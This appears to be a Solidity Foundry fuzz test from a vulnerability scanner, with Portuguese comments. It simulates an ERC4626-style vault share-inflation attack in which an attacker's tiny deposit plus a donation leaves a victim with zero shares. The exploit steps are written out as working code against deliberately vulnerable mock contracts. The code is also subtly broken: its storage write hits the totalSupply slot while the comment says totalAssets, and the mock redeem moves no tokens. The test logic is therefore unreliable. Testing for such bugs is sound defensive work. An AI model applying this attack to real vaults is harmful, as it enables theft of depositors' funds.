// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract MockERC20 {
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    function approve(address spender, uint256 amt) external returns(bool){ allowance[msg.sender][spender]=amt; return true; }
    function transfer(address to, uint256 amt) external returns(bool){ balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address from, address to, uint256 amt) external returns(bool){
        if(allowance[from][msg.sender]!= type(uint256).max) allowance[from][msg.sender]-=amt;
        balanceOf[from]-=amt; balanceOf[to]+=amt; return true;
    }
    function mint(address to, uint256 amt) external { balanceOf[to]+=amt; }
}

contract MockVault {
    MockERC20 public asset;
    uint256 public totalSupply;
    uint256 public totalAssets;
    mapping(address=>uint256) public balanceOf;
    constructor(address _asset){asset=MockERC20(_asset);}
    function deposit(uint256 assets, address receiver) external returns(uint256){
        asset.transferFrom(msg.sender, address(this), assets);
        uint256 shares = totalSupply==0? assets : assets*totalSupply/totalAssets;
        totalSupply+=shares; totalAssets+=assets; balanceOf[receiver]+=shares; return shares;
    }
    function redeem(uint256 shares, address receiver, address owner) external returns(uint256){
        uint256 assets = shares*totalAssets/totalSupply; balanceOf[owner]-=shares; totalSupply-=shares; totalAssets-=assets; return assets;
    }
}

contract DivinoScannerPrecisionV2 is Test {
    MockERC20 public underlying;
    MockVault public targetVault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        underlying = new MockERC20();
        targetVault = new MockVault(address(underlying));
    }

    function testFuzz_InflationCritical(uint256 donation, uint256 victimDeposit) public {
        donation = bound(donation, 1 ether, 100 ether);
        victimDeposit = bound(victimDeposit, 1000, 10 ether);

        underlying.mint(attacker, 1 + donation);
        underlying.mint(victim, victimDeposit);

        vm.startPrank(attacker);
        underlying.approve(address(targetVault), type(uint256).max);
        targetVault.deposit(1, attacker);
        // Simula doação direta pro vault (inflação)
        underlying.mint(address(targetVault), donation);
        targetVault.totalAssets(); // atualiza view
        // hack: aumenta totalAssets na marra pro teste
        vm.store(address(targetVault), bytes32(uint256(1)), bytes32(targetVault.totalAssets() + donation));
        vm.stopPrank();

        vm.startPrank(victim);
        underlying.approve(address(targetVault), type(uint256).max);
        uint256 sharesVictim = targetVault.deposit(victimDeposit, victim);

        console.log("Donation:", donation);
        console.log("Victim deposit:", victimDeposit);
        console.log("Shares victim:", sharesVictim);

        if(sharesVictim == 0){
            console.log("[CRITICAL FOUND] Victim got 0 shares!");
        }
        // Se shares ==0, encontramos o bug crítico
        assertGt(sharesVictim, 0, "CRITICAL: inflation -> 0 shares");
        vm.stopPrank();
    }
}
